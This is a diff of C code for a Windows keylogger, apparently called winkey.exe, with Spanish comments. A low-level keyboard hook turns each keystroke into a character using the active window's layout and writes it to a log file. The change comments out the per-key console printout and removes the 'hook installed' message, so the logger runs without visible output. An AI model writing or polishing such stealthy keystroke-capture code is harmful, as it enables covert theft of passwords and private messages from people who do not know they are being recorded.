@@ -81,19 +81,19 @@ LRESULT CALLBACK LowLevelKeyboardProc(
             }
         }
 
-        // --- INICIO DE LA MODIFICACIÓN ---
+        // --- Obtener el Idioma que se esta usando ---
         // Obtener el HILO de la ventana activa para saber su distribución de teclado
         DWORD threadId = GetWindowThreadProcessId(currentHnwd, NULL);
         // Obtener la distribución de teclado (Qwerty, azerty, etc) de ese hilo
         HKL keyboardLayout = GetKeyboardLayout(threadId);
-        // --- FIN DE LA MODIFICACIÓN ---
+        // --- Fin de obtener el idioma ---
 
         // Funcion para obtener el caracter o nombre de la tecla
         char* keyChar = VirtualKeyToChar(vkCode, p->scanCode, keyboardLayout);
 
         // Ver en terminal las teclas pulsadas ejecutando winkey.exe 
         //printf("Tecla: %lu, \tchar: %s\n", vkCode, keyChar);
-        printf("vkCode: %lu, scanCode: %lu, char: %s\n", vkCode, p->scanCode, keyChar);
+        //printf("vkCode: %lu, scanCode: %lu, char: %s\n", vkCode, p->scanCode, keyChar);
 
         // crear archivo si no existe
         if (logFile) {
@@ -105,7 +105,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(
 }
 
 // Activar hook
-
 BOOL ActivateHook(void)
 {
     // Crear archivo de log
@@ -119,7 +118,6 @@ BOOL ActivateHook(void)
         printf("Error to create the hook\n");
         return FALSE;
     }
-    printf("Hook instalado. Pulsa algunas teclas. ESC para salir.\n");
     return TRUE;
 }
 
